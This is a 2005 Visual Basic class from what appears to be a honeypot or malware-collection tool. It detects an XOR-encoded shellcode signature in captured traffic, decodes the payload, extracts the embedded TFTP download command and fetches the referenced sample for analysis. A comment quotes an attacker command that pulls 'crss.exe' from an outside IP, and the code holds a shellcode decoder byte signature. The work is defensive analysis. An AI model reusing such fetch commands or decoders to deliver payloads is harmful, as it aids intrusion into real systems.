VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "CSc_tftp"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit

'Author: david@idefense.com
'
'License: Copyright (C) 2005 David Zimmer <david@idefense.com, dzzie@yahoo.com>
'
'         This program is free software; you can redistribute it and/or modify it
'         under the terms of the GNU General Public License as published by the Free
'         Software Foundation; either version 2 of the License, or (at your option)
'         any later version.
'
'         This program is distributed in the hope that it will be useful, but WITHOUT
'         ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
'         FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
'         more details.
'
'         You should have received a copy of the GNU General Public License along with
'         this program; if not, write to the Free Software Foundation, Inc., 59 Temple
'         Place, Suite 330, Boston, MA 02111-1307 USA
Dim start_signature As String
Public err_msg As String
Public URL As String
Public SampleFile As String

Private Sub Class_Initialize()

    start_signature = "90 EB 02 EB 05 E8 F9 FF FF FF 5B 31 C9"
    
    Dim tmp() As String, i As Long
    tmp = Split(start_signature, " ")
    
    For i = 0 To UBound(tmp)
        tmp(i) = Chr(CInt("&h" & tmp(i)))
    Next
    
    start_signature = Join(tmp, "")

End Sub


Function CheckSignature(ByVal MemBuffer As String) As Boolean
    MemBuffer = Replace(MemBuffer, Chr(0), Empty)
    If InStr(MemBuffer, start_signature) > 0 Then CheckSignature = True
End Function

Function HandleShellcode(remoteHost As String, filepath As String, MemBuffer As String) As Boolean
     
    Dim tmp() As String
    Dim host As String
    Dim File As String
    Dim tftp As CTFTPClient
    
    On Error GoTo hell
      'format of url = tftp.exe -i 218.1.78.197 get crss.exe
      
      URL = Empty
      SampleFile = Empty
      
1     URL = TftpParser(MemBuffer)
          
     If Len(URL) > 0 Then
     
        If InStr(URL, "0.0.0.0") > 0 Then URL = Replace(URL, "0.0.0.0", remoteHost)
        
2        tmp = Split(URL, " ")
3        host = tmp(2)
4        File = tmp(4)
5        If CountOccurances(host, ".") <> 3 Then
            err_msg = "Invalid host in url: " & URL
            Exit Function
        End If
            
        Set tftp = New CTFTPClient
        MoveFileToDumpDir filepath, eRPC445, "sc_tftp"
        SampleFile = GetFreeFileInDumpDir(eRPC445, "./../")
                
9        If tftp.GetFile(File, SampleFile, host) Then
            On Error Resume Next
            err_msg = "Succeeded: " & URL
            HandleShellcode = True
        Else
            If tftp.TimedOut Then err_msg = "tftp to " & host & " timed out"
            If tftp.HadError Then err_msg = "tftp had error " & tftp.ErrorMsg
        End If
        
        Unload tftp
        Set tftp = Nothing
        
     End If
    
Exit Function
hell: err_msg = "Error in scTftp " & Erl & " " & Err.Description
End Function




Private Function TftpParser(buffer As String) As String
    
    
    'E4 = length,  12 = xor key
    'mov     cl, 0E4h ; 'ä'
    'xor     byte ptr [ebx+0Ch], 12h
    'B1 E4 80 73 0C 12
    
    'next bytes before start decode
    '43 E2 F9
    'inc ebx
    'loop    decoder
        
    Dim pointer As Long
    Dim Length As Long
    Dim key As Long
    Dim n As Byte
    Dim f As Long
    Dim shellcode
    Dim x, i
    
    shellcode = Replace(buffer, Chr(0), Empty)
    pointer = InStr(1, shellcode, start_signature)
    
    If pointer < 1 Then
        err_msg = " - start signature not found mabey new shellcode"
        Exit Function
    End If
    
    If pointer > 0 Then
       pointer = pointer + Len(start_signature)
       
       Dim B() As Byte
       shellcode = Mid(shellcode, pointer)
       B() = StrConv(shellcode, vbFromUnicode)
       
       Length = B(1)
       key = B(5)
    
       pointer = 9  'to start of decode
         
       For i = 0 To Length
           B(pointer + i) = B(pointer + i) Xor key
       Next
               
       ReDim Preserve B(Length)
       x = StrConv(B, vbUnicode)
       pointer = InStr(x, "tftp")
       If pointer > 0 Then
            URL = Mid(x, pointer, InStr(pointer, x, Chr(0)) - pointer)
            TftpParser = URL
       Else
            err_msg = " - No tftp url found?"
       End If
   
    End If
    
End Function


